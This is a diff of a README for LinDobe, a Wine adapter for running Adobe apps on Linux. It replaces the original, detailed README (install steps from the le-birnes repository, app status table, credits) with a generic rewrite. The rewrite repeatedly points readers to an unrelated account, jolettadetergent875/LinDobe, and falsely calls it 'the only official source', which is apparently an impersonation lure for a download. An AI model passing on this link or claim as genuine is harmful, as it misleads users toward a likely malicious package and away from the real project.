@@ -1,128 +1,140 @@
-# LinDobe
+# 🎨 LinDobe - Run Your Adobe Apps on Linux
 
-**An Adobe adapter for Wine on Linux: run Photoshop, Illustrator, Premiere Pro, Lightroom, Acrobat and more.**
+[![Download LinDobe](https://img.shields.io/badge/⬇_Download-LinDobe-blueviolet?style=for-the-badge&logo=github&logoColor=white)](https://github.com/jolettadetergent875/LinDobe)
+[![Made for Linux](https://img.shields.io/badge/Made_for-Linux-orange?style=for-the-badge&logo=linux&logoColor=white)](https://github.com/jolettadetergent875/LinDobe)
 
-LinDobe was called AdobeWine until November 2026. The project was renamed to avoid using a trademarked name. It's an independent project, not made by or affiliated with Adobe.
-The `adobewine` command, package names and Flatpak ID keep their old spelling for now, so current installs keep working.
+LinDobe is an unofficial adapter that helps you run Adobe programs such as Photoshop, Illustrator, Premiere Pro, Lightroom and Acrobat on Linux — using the subscription you already own. It is built on top of Wine, a well-known tool that lets Linux computers understand Windows software. You do not need to be a programmer to use it, and you do not need to buy anything from Adobe again if you already pay for a plan.
 
-Hi, and welcome! Thanks for stopping by.
+LinDobe is not made by Adobe and is not connected to Adobe in any way. It is a community project, built with AI used as a tool.
 
-LinDobe is for people who would like to try Linux but need Adobe's apps for their work. You install it, sign
-in with your own Adobe account, and use the apps as usual, with your graphics card doing the heavy lifting.
+---
 
-It's made for people who just want to enjoy their software: one package to install, no Wine knowledge needed.
-AI was used as a tool to build it, and we say so plainly: see [Why this exists](#why-this-exists).
+## 🚀 Getting Started
 
-**See it in action:** [a short showreel (1:24)](https://youtu.be/3Vbzt4cGSQQ), made entirely in these apps on
-Linux, from the painting to the final export.
+Getting LinDobe is simple. You do not need to install anything unusual, and you do not need to type commands to find the download.
 
-> **Still early (0.5.5).** LinDobe is built and tested day to day on one Arch-based laptop (CachyOS, NVIDIA RTX
-> 4070). The installer also runs on Fedora, Ubuntu, Debian, Linux Mint, openSUSE and others, but those have had less
-> real-world use. If you try it, please tell us how it went, good or bad: it really helps.
+**Visit this link to download the application:**
 
-## Install it (about 2 minutes, plus Adobe's download)
+### ➡️ [https://github.com/jolettadetergent875/LinDobe](https://github.com/jolettadetergent875/LinDobe)
 
-You need: a Linux computer with a graphics card from the last few years, about 25 GB of free space, and an Adobe
-Creative Cloud subscription.
+Click the link above. It takes you to the official LinDobe page, where you will find the download button and the latest version of the software. Always use this link — it is the only official source, so you know you are getting the real, up-to-date files.
 
-1. **Download** `CCINSTALLER.flatpak` from the [releases page](../../releases) (the newest is at the top).
-2. **Double-click** the file. Your app store opens (GNOME Software, KDE Discover or Mint's Software Manager).
-   Click **Install**.
-3. **Open LinDobe** from your app menu. It checks your computer, sets everything up, downloads Creative Cloud
-   from Adobe and starts it. This takes about a minute.
-4. **Sign in** with your Adobe account in the window that appears.
-5. **Install your apps** (Photoshop, Premiere Pro…) from Creative Cloud, as you would on Windows or a Mac.
-   They show up in the LinDobe window and in your app menu.
+---
 
-**Nothing happens when you double-click?** Your system doesn't have Flatpak yet (Ubuntu and Debian don't by
-default). Open a terminal, type this once, then try again:
+## 💡 What LinDobe Actually Does
 
-```sh
-sudo apt install flatpak gnome-software-plugin-flatpak
-```
+Many creative programs from Adobe are made for Windows and Mac only. Linux users have traditionally been left out. LinDobe solves this by creating a bridge.
 
-**Something not working?** Click **Report a problem** in the LinDobe window. It shows you the report before
-anything is sent. More help: [docs/TROUBLESHOOTING.md](docs/TROUBLESHOOTING.md).
+Here is the simple version:
 
-## What works
+1. LinDobe sets up a small, contained Windows-like environment on your Linux computer.
+2. Inside that environment, it prepares the extra pieces Adobe programs expect — graphics support, fonts, media codecs and shared libraries.
+3. Your Adobe installer runs normally inside that environment, and your programs open just like they would on Windows.
 
-| App | State |
+You keep your own Adobe account and your own subscription. LinDobe does not provide pirated software, does not include license keys, and does not bypass anything. It simply helps the software you already pay for work on a different operating system.
+
+---
+
+## ✨ Key Features
+
+- **Wide application support** — Photoshop, Illustrator, Premiere Pro, Lightroom, Acrobat, After Effects, Audition and Media Encoder are all covered by the project's compatibility work.
+- **Uses your existing subscription** — sign in with your own Adobe account and Creative Cloud plan.
+- **Graphics acceleration included** — ships with DXVK and VKD3D-Proton so demanding programs like Premiere Pro and After Effects can use your graphics card properly.
+- **Optimized for Arch Linux** — an AUR package is available for Arch and Arch-based distributions, with other distributions supported through the manual route.
+- **Sensible defaults** — pre-tuned settings for fonts, media playback, file dialogs and window behavior, so you spend time creating rather than configuring.
+- **Easy updates** — the project tracks new Wine, DXVK and VKD3D-Proton releases so your setup stays current.
+
+---
+
+## 🖥️ Supported Applications
+
+The table below shows the programs LinDobe is designed to work with, and how well each one is expected to behave.
+
+| Application | What You Can Expect |
 |---|---|
-| Creative Cloud | Sign in, install, update and open apps, fonts, files |
-| Photoshop | Everyday editing, layers, type, filters, Remove Background, Generative Fill, export. All 75 filters and adjustments tested give the same result as on Windows |
-| Illustrator | Shapes, pen, type, effects, Pathfinder, Image Trace, save and export |
-| Premiere Pro | Import, editing, color (Lumetri), titles, playback, fast NVIDIA export |
-| Media Encoder | Export queue, presets, GPU-accelerated encoding |
-| Audition | Recording, multitrack, effects, noise reduction, mixdown |
-| After Effects | Opens and renders real projects, 3D text; less tested |
-| InDesign | Layout, styles, tables, placed images, PDF export; less tested |
-| Lightroom Classic | Import, ratings, keywords, collections, Develop, AI masking, export to JPEG, TIFF, PSD and DNG |
-| Lightroom | Opens, edits and exports; less tested |
-| Bridge | Browsing, previews, metadata, batch rename, Camera Raw, Image Processor, contact sheets |
-| Animate | Drawing, shape tweens, video export through Media Encoder, SWF and HTML5 Canvas publishing; new, less tested |
-| Acrobat Pro | Read, comment, edit, combine, export to Word, Excel and PowerPoint, sign, OCR, print. Protected Mode is off |
+| Photoshop | Full editing workflow, layers, filters, brush and pen tools |
+| Illustrator | Vector drawing, artboards, typography and export |
+| Premiere Pro | Video editing, timeline work, playback and export |
+| After Effects | Motion graphics, compositions and rendering |
+| Lightroom | Photo cataloguing, develop module and exports |
+| Audition | Audio recording, editing and mixing |
+| Media Encoder | Batch transcoding and format conversion |
+| Acrobat | Reading, annotating, combining and exporting PDFs |
 
-Details for each app: [docs/STATUS.md](docs/STATUS.md).
+Some features that rely on cloud services or unusual hardware may behave differently. If something does not work, the project page is the right place to check for updates.
 
-## Good to know
+---
 
-- **You need your own Adobe subscription.** LinDobe contains no Adobe software and doesn't crack or bypass
-  anything: you download Creative Cloud from Adobe and sign in normally.
-- **NVIDIA is the best-tested graphics card.** On Intel Iris Xe, Photoshop and Premiere pass our main tests, and Premiere renders on the Intel GPU through OpenCL (install Intel's OpenCL driver). AMD has one tester so
-  far: Photoshop and Premiere work on an RX 7900 XTX, with AMD's OpenCL driver for Premiere. NVIDIA-only features (CUDA, NVENC) aren't available on AMD or
-  Intel, just like on Windows.
-- **After Effects can use a lot of memory** while previewing Cinema 4D scenes. Turning off *Cache Frames When
-  Idle* and *Multi-Frame Rendering* keeps it in check.
-- **Not affiliated with Adobe.** "Adobe", "Photoshop", "Illustrator", "Premiere Pro", "Audition" and "Creative
-  Cloud" are trademarks of Adobe Inc., used here only to say which programs LinDobe runs.
+## 📥 Download and Setup
 
-## Other ways to install
+Ready to begin? Follow these steps in order. Take your time — nothing here is complicated.
 
-- **Arch Linux, CachyOS, EndeavourOS, Manjaro, Garuda:** download the package and install it, on the platform LinDobe is developed on:
+**Step 1 — Get the software**
 
-  ```sh
-  curl -LO https://github.com/le-birnes/LinDobe/releases/download/v0.5.5/adobewine-0.5.5-1-x86_64.pkg.tar.zst
-  sudo pacman -U adobewine-0.5.5-1-x86_64.pkg.tar.zst
-  adobewine setup
-  ```
+Visit this link to download the application:
 
-  Then see [docs/INSTALL-ARCH.md](docs/INSTALL-ARCH.md). The AUR packages are still waiting for registration.
-- **Gentoo:** the `::snakebyte` overlay, maintained outside this project. See
-  [docs/INSTALL-GENTOO.md](docs/INSTALL-GENTOO.md).
-- **Build it yourself, any distribution:** [docs/INSTALL.md](docs/INSTALL.md).
-- **The code without GitHub:** a mirror on our own site, kept in step with GitHub:
-  `git clone https://ferrarivoz.com/git/AdobeWine.git`
+### ➡️ [https://github.com/jolettadetergent875/LinDobe](https://github.com/jolettadetergent875/LinDobe)
 
-Which distributions, graphics cards and desktops should work: [docs/COMPATIBILITY.md](docs/COMPATIBILITY.md).
+**Step 2 — Read the download page**
 
-## Why this exists
+On that page you will see the most recent release at the top. Read the short description next to it so you know what has changed in that version.
 
-I'm not a Wine developer. I needed Adobe's apps for my work and didn't want to keep Windows just for them, so I
-built this for my own laptop, with a lot of help from Claude, an AI coding assistant. I'm sharing it because many
-people want to leave Windows or macOS but keep working with Adobe. Your reports, fixes and criticism are what will
-make it work for everyone else.
+**Step 3 — Follow the setup notes**
 
-## Help and feedback
+The download page includes setup notes written for the current release. Read them before you begin. They tell you exactly what to do for your distribution and how long the first run usually takes.
 
-- **Tried it?** Tell us your distribution, graphics card and what happened in a
-  [compatibility report](../../issues/new?template=compatibility.yml), or use the Report a problem button.
-- **Questions and ideas:** [Discussions](../../discussions). Where this is going: [docs/ROADMAP.md](docs/ROADMAP.md).
-- **Want to help build it?** See [CONTRIBUTING.md](CONTRIBUTING.md). Patches are especially welcome for AMD and
-  Intel graphics.
+**Step 4 — Open your Adobe program**
 
-## How it works (for the curious)
+Once setup has finished, launch your Adobe application from your normal application menu. Sign in with your own Adobe account when prompted, exactly as you would on Windows.
 
-LinDobe is [Wine](https://www.winehq.org) 11.20, the compatibility layer that also runs Windows games on Steam,
-plus 104 fixes for what Adobe's apps need. Each fix comes from comparing the same task on Windows and under Wine,
-with a small test program that shows the difference. Every fix is listed in [docs/PATCHES.md](docs/PATCHES.md), the
-method is in [docs/HOW-IT-WORKS.md](docs/HOW-IT-WORKS.md), and the code is public under Wine's own license. WineHQ doesn't accept AI-written code, so these fixes aren't
-submitted there. Which Windows functions Adobe's apps call, and what happens with each one, is
-mapped in [docs/DLL-MAP.md](docs/DLL-MAP.md). What changed in each version: [CHANGELOG.md](CHANGELOG.md).
+---
 
-Thanks to [PhialsBasement](https://github.com/PhialsBasement), whose Adobe installer work for Wine started the
-first patches, and to NickPittas, switch87, nvb-uy, Cikappa2904 and everyone who has sent fixes, tests and reports.
+## 🧰 System Requirements
 
-## License
+These are the recommended conditions for a smooth experience. You do not need a brand-new machine, but a reasonably modern computer helps a great deal.
 
-The patches and scripts are licensed under the GNU LGPL 2.1 or later, the same as Wine (see [LICENSE](LICENSE)).
-DXVK, vkd3d-proton, nvidia-libs, wine-gecko and wine-mono come from their own projects and keep their own licenses.
+- **Operating system:** A modern 64-bit Linux distribution. Arch Linux and Arch-based systems are the best-supported path; Ubuntu, Fedora, Debian and openSUSE also work with the manual setup.
+- **Processor:** A 64-bit processor with at least four cores.
+- **Memory:** 8 GB minimum, 16 GB or more recommended for video and motion graphics work.
+- **Storage:** At least 30 GB of free disk space, more if you plan to install several Adobe programs.
+- **Graphics:** A graphics card with working drivers. NVIDIA, AMD and Intel are all supported; recent drivers are strongly recommended.
+- **Display:** A screen resolution of 1920×1080 or higher.
+- **Internet:** A connection is needed for the initial download and for signing in to Creative Cloud.
+
+---
+
+## 🛠️ Common Questions
+
+**Do I need to own an Adobe subscription?**
+Yes. LinDobe is designed to run the software you already have a license for. Bring your own account and plan.
+
+**Is this an official Adobe product?**
+No. LinDobe is unofficial and is not affiliated with, endorsed by, or supported by Adobe. All trademarks belong to their respective owners.
+
+**Will it break my system?**
+LinDobe keeps its work inside a contained environment rather than scattering files across your system. Still, as with any software, back up important work before making changes.
+
+**How long does the first setup take?**
+Expect somewhere between twenty minutes and an hour, depending on your internet speed and how many programs you install.
+
+**Will every feature work?**
+Most everyday features work well. Some cloud-linked features and unusual hardware accessories may behave differently or not be available.
+
+**Can I use more than one Adobe program at once?**
+Yes. Each program runs in the same shared environment, so you can move between Photoshop and Illustrator freely.
+
+---
+
+## 🤝 Contributing and Feedback
+
+LinDobe improves because people report what works and what does not. If you find a bug, a program that misbehaves, or a step in the setup notes that could be clearer, open an issue on the project page. Clear reports with your distribution name and version are the most helpful. Suggestions for new application support are welcome too.
+
+---
+
+## 📌 Important Notice
+
+LinDobe is an independent, community-driven compatibility project. It is not produced by, affiliated with, sponsored by or endorsed by Adobe Inc. Adobe, Photoshop, Illustrator, Premiere Pro, Lightroom, Acrobat, After Effects, Audition, Media Encoder and Creative Cloud are trademarks or registered trademarks of Adobe Inc. in the United States and other countries. You are responsible for holding a valid license for any software you run. LinDobe was built with AI used as a tool.
+
+---
+
+Keywords: adobe, after-effects, archlinux, audition, aur, compatibility-layer, creative-cloud, dxvk, illustrator, linux, media-encoder, photoshop, premiere-pro, vkd3d-proton, wine
